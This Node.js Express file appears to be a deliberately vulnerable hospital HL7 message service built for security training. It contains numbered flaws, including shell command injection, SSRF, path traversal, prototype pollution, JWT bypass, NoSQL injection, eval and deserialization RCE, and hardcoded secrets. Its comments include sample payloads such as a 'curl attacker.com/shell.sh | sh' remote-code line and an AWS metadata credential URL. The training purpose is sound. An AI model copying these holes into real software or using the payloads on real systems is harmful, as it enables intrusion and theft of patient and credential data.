/**
 * MediCore HMS - HL7 Message Processing Service
 * WARNING: This service contains intentional security vulnerabilities for security training.
 * DO NOT use in production. All vulnerabilities are numbered and documented.
 *
 * This Node.js Express service receives HL7 v2/v3 messages from hospital systems
 * (EHR, LIS, RIS, pharmacy systems) and routes them to the Django backend.
 */

'use strict';

const express = require('express');
const { exec } = require('child_process');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const jwt = require('jsonwebtoken');
const mongoose = require('mongoose');
const serialize = require('node-serialize');
const _ = require('lodash');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ==========================================
// VULN-527: Hardcoded JWT secret in source code
// This appears in git history, Docker images, CI logs, and npm audit trails.
// An attacker with the secret can forge tokens for any user/role.
// ==========================================
const JWT_SECRET = 'hl7service_jwt_2024';

// VULN-527 (additional): More hardcoded secrets
const DB_PASSWORD = 'medicore_mongo_pass_2024';
const REDIS_PASSWORD = 'redis_secret_medicore';
const INTERNAL_API_KEY = 'AKIAFAKE12345HL7SVC';  // Fake AWS-style key format

// ==========================================
// VULN-530: CORS misconfiguration
// Wildcard origin combined with credentials:true violates the CORS spec
// but some implementations handle this insecurely.
// Any origin can make credentialed requests to this service.
// ==========================================
app.use((req, res, next) => {
    // VULN-530: Should use explicit origin list, not wildcard + credentials
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Credentials', 'true');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-HL7-Message-Type');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

// MongoDB connection (used for NoSQL injection demo)
mongoose.connect(`mongodb://admin:${DB_PASSWORD}@mongodb:27017/medicore_hl7`, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
}).catch(err => console.error('MongoDB connection error:', err));

// ==========================================
// HL7 Message Schema (MongoDB)
// ==========================================
const hl7MessageSchema = new mongoose.Schema({
    sender: String,
    messageType: String,
    content: String,
    patientId: String,
    receivedAt: { type: Date, default: Date.now },
    processed: { type: Boolean, default: false },
});
const HL7Message = mongoose.model('HL7Message', hl7MessageSchema);


// ==========================================
// Route: Process incoming HL7 message
// ==========================================
app.post('/hl7/process', (req, res) => {
    const message = req.body.message || '';
    const sender = req.body.sender || 'unknown';

    // VULN-526: Log injection via sender field — no newline sanitization.
    // If sender = "lab_system\nINFO HL7 Admin login: root (success)"
    // The forged entry appears in service logs, enabling log forgery/covering tracks.
    console.log(`Received HL7 from: ${sender}`);

    // VULN-521: Command injection via message content passed to hl7parse CLI tool.
    // The hl7parse utility is called via shell with the message as a command-line arg.
    // Attacker sends: message = "MSH|^~\\&|...|; curl attacker.com/shell.sh | sh"
    // The semicolon breaks out of the argument and the shell executes arbitrary commands.
    exec(`hl7parse --message "${message}" --format json`, (error, stdout, stderr) => {
        if (error) {
            console.error(`HL7 parse error: ${error.message}`);
            return res.status(500).json({ error: error.message });
        }

        let parsedMessage;
        try {
            parsedMessage = JSON.parse(stdout);
        } catch (e) {
            parsedMessage = { raw: stdout };
        }

        // VULN-533: Store unsanitized HL7 data, later used in DB query (second-order)
        // The sender value is stored here without sanitization
        HL7Message.create({
            sender: sender,           // VULN-533: Unsanitized sender stored in MongoDB
            messageType: parsedMessage.messageType || 'unknown',
            content: message,
            patientId: parsedMessage.patientId || '',
        }).catch(err => console.error('DB save error:', err));

        res.json({ status: 'processed', message: parsedMessage });
    });
});


// ==========================================
// Route: Register webhook for HL7 notifications
// ==========================================
app.post('/hl7/webhook/register', async (req, res) => {
    const webhookUrl = req.body.webhook_url;
    const event = req.body.event || 'message.received';

    // VULN-522: SSRF via webhook_url — the URL is fetched without validation.
    // An attacker registers a webhook pointing to an internal service:
    // webhook_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/medicore-role"
    // This retrieves AWS IAM credentials via the IMDS endpoint.
    // Or: webhook_url = "http://redis:6379/" to probe internal Redis.
    try {
        // VULN-522: No URL allowlist, no SSRF protection, no scheme restriction
        const testResponse = await axios.get(webhookUrl, {
            timeout: 5000,
            validateStatus: () => true,  // Accept any HTTP status (even 5xx from internal services)
        });
        console.log(`Webhook test to ${webhookUrl}: HTTP ${testResponse.status}`);
    } catch (err) {
        // Even on error, we store the webhook — error might mean it's an internal service
        console.log(`Webhook ${webhookUrl} test failed: ${err.message}`);
    }

    res.json({
        status: 'registered',
        webhook_url: webhookUrl,
        event: event,
        debug: `Webhook registered and tested: ${webhookUrl}`,
    });
});


// ==========================================
// Route: Serve HL7 message templates
// ==========================================
app.get('/hl7/template/:template', (req, res) => {
    const template = req.params.template;

    // VULN-523: Path traversal in template parameter.
    // Attacker requests: /hl7/template/../../.env
    // or: /hl7/template/../../../etc/passwd
    // The template name is used directly in file path construction.
    // Fix: use path.resolve() and verify result starts with templates directory.
    const templatePath = `./templates/${template}`;

    try {
        // VULN-523: No path.resolve() or directory containment check
        const content = fs.readFileSync(templatePath, 'utf8');
        res.type('text/plain').send(content);
    } catch (err) {
        // VULN-523: Error message reveals attempted path — helps attacker probe
        res.status(404).json({ error: `Template not found: ${templatePath}` });
    }
});


// ==========================================
// Route: Update HL7 service configuration
// ==========================================
app.post('/hl7/config/update', (req, res) => {
    const config = {
        maxMessageSize: 65536,
        allowedSenders: [],
        processingTimeout: 30000,
        retryAttempts: 3,
    };

    // VULN-524: Prototype pollution via Object.assign with req.body.
    // Attacker sends: {"__proto__": {"isAdmin": true, "polluted": "yes"}}
    // or: {"constructor": {"prototype": {"isAdmin": true}}}
    // This modifies Object.prototype, affecting all objects in the process.
    // Can be used to bypass authorization checks: if (user.isAdmin) ...
    Object.assign(config, req.body);  // VULN-524: Unsafe merge with user-controlled object

    // Also uses lodash _.merge which is vulnerable in lodash@4.17.4
    // VULN-524 (lodash): _.merge also pollutes Object.prototype
    const mergedConfig = _.merge({}, config, req.body);

    res.json({ status: 'config updated', config: mergedConfig });
});


// ==========================================
// Route: Verify JWT token (JWT alg:none vulnerability)
// ==========================================
app.post('/hl7/auth/verify', (req, res) => {
    const token = req.headers.authorization?.replace('Bearer ', '') || req.body.token;

    if (!token) {
        return res.status(401).json({ error: 'No token provided' });
    }

    // VULN-525: Manual JWT decode without enforcing algorithm — accepts alg:none.
    // The token header is base64-decoded and the algorithm is checked,
    // but there's no verification that the algorithm is the expected HS256.
    // An attacker can create a token with alg:"none" and empty signature
    // that passes this check entirely.
    try {
        // Decode header without verification
        const parts = token.split('.');
        if (parts.length < 2) {
            return res.status(401).json({ error: 'Invalid token format' });
        }

        // VULN-525: Decoding header to check algorithm, but not enforcing it
        const headerDecoded = JSON.parse(Buffer.from(parts[0], 'base64').toString());
        const payloadDecoded = JSON.parse(Buffer.from(parts[1], 'base64').toString());

        // VULN-525: If alg is 'none', the signature check is bypassed entirely
        if (headerDecoded.alg === 'none') {
            // Should REJECT tokens with alg:none, not accept them
            console.log('VULN-525: Accepting alg:none token (no signature verification)');
            return res.json({ valid: true, payload: payloadDecoded, alg: 'none' });
        }

        // For non-none algorithms, verify with the hardcoded secret (VULN-527)
        const verified = jwt.verify(token, JWT_SECRET);

        // VULN-531: No expiration check — exp claim not validated
        // jwt.verify() does check exp by default, but the token issuer (VULN-532)
        // doesn't set exp in the first place
        return res.json({ valid: true, payload: verified });

    } catch (err) {
        return res.status(401).json({ error: err.message });
    }
});


// ==========================================
// Route: Issue JWT token for HL7 system access
// ==========================================
app.post('/hl7/auth/token', (req, res) => {
    const { system_id, system_key } = req.body;

    // Simplified authentication (in reality would check against a database)
    if (!system_id || !system_key) {
        return res.status(400).json({ error: 'system_id and system_key required' });
    }

    const payload = {
        system: system_id,
        role: 'hl7_sender',
        permissions: ['hl7:read', 'hl7:write'],
        // VULN-531: No 'exp' claim — token never expires
        // VULN-531: No 'iat', 'nbf', or 'jti' claims
    };

    // VULN-532: Weak HMAC secret 'secret' — trivially brute-forceable
    // Any attacker can forge tokens with this secret in minutes
    const token = jwt.sign(payload, 'secret');  // VULN-532: Should use JWT_SECRET at minimum

    res.json({
        token: token,
        system: system_id,
        warning: 'Token has no expiry',
    });
});


// ==========================================
// Route: Query stored HL7 messages (NoSQL injection)
// ==========================================
app.get('/hl7/messages/search', async (req, res) => {
    const sender = req.query.sender;
    const messageType = req.query.type;

    // VULN-528: NoSQL injection in MongoDB query.
    // MongoDB operators can be injected via query parameters:
    // GET /hl7/messages/search?sender[$ne]=null
    // This returns ALL messages regardless of sender value.
    // More dangerous: sender[$where]=function(){return sleep(5000)}
    // Or: sender[$regex]=.* (returns all)
    // The unsanitized req.query object is passed directly to .find()
    const query = {};
    if (sender) query.sender = sender;         // VULN-528: sender can be {$ne: null}
    if (messageType) query.messageType = messageType;  // VULN-528: also injectable

    try {
        // VULN-528: Direct use of user-controlled object as MongoDB query
        // Mongoose does NOT automatically sanitize query operators
        const messages = await HL7Message.find(query).limit(100);
        res.json({ messages: messages, count: messages.length });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});


// ==========================================
// Route: Second-order NoSQL injection
// ==========================================
app.get('/hl7/messages/audit', async (req, res) => {
    const sender_filter = req.query.sender_filter;

    // VULN-533: Second-order injection — use stored (potentially malicious) sender value
    // in a new database query. The sender was stored unsanitized via the /process endpoint.
    let stored_sender = '';
    try {
        const lastMsg = await HL7Message.findOne({ messageType: req.query.type || 'ADT' });
        stored_sender = lastMsg ? lastMsg.sender : sender_filter;
    } catch (err) {
        stored_sender = sender_filter;
    }

    // VULN-533: Using stored (potentially malicious) sender in a new query
    // If stored_sender was set to {$where: "..."} via the /process endpoint,
    // it fires here when used in the .find() query
    try {
        const audit = await HL7Message.find({ sender: stored_sender });
        res.json({ audit_count: audit.length, sender_used: stored_sender });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});


// ==========================================
// Route: Patient name greeting (template injection)
// ==========================================
app.get('/hl7/patient/greet', (req, res) => {
    const name = req.query.name || 'Patient';
    const template = req.query.template || 'default';

    // VULN-529: Template injection via eval() with template literal.
    // The name and template parameters are embedded in a template literal
    // that is then passed to eval(). An attacker can inject:
    // name = "${require('child_process').execSync('id').toString()}"
    // or: name = "${process.env.SECRET_KEY}"
    // This achieves RCE or secrets exfiltration.
    try {
        // VULN-529: eval() with user-controlled template literal content
        // The backtick template allows arbitrary expression injection via ${}
        const greeting = eval(`\`Hello ${name}, your appointment is ready.\``);
        res.json({ greeting: greeting });
    } catch (err) {
        // VULN-529: Error includes the evaluated expression — aids attacker debugging
        res.status(500).json({ error: err.message, input: name });
    }
});


// ==========================================
// Route: Deserialize cached HL7 processing state
// ==========================================
app.post('/hl7/cache/restore', (req, res) => {
    const cachedState = req.body.state;

    if (!cachedState) {
        return res.status(400).json({ error: 'No state provided' });
    }

    // VULN-534: Insecure deserialization via node-serialize.
    // node-serialize@0.0.4 (CVE-2017-5941) executes arbitrary code embedded in
    // serialized objects via the IIFE pattern: {"field":"_$$ND_FUNC$$_function(){...}()"}
    // An attacker sends: {"_": "_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()"}
    // This achieves RCE via the deserialization step.
    try {
        const restoredState = serialize.unserialize(cachedState);  // VULN-534: RCE via IIFE
        res.json({ status: 'restored', state: restoredState });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});


// ==========================================
// Health check (exposes sensitive info)
// ==========================================
app.get('/health', (req, res) => {
    // VULN-535: Health endpoint exposes internal configuration without auth
    res.json({
        status: 'healthy',
        service: 'medicore-hl7',
        node_version: process.version,
        uptime: process.uptime(),
        // VULN-535: Environment variables exposed in health check
        environment: {
            NODE_ENV: process.env.NODE_ENV,
            DB_HOST: process.env.DB_HOST,
            REDIS_HOST: process.env.REDIS_HOST,
            // Inadvertently exposes connection strings with credentials
        },
        // VULN-535: Memory usage — helps attackers plan DoS timing
        memory: process.memoryUsage(),
    });
});


const PORT = process.env.PORT || 3001;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`MediCore HL7 Service running on port ${PORT}`);
    // VULN-536: JWT secret logged at startup — appears in container logs
    console.log(`JWT_SECRET: ${JWT_SECRET}`);
    console.log(`Internal API Key: ${INTERNAL_API_KEY}`);
});

module.exports = app;
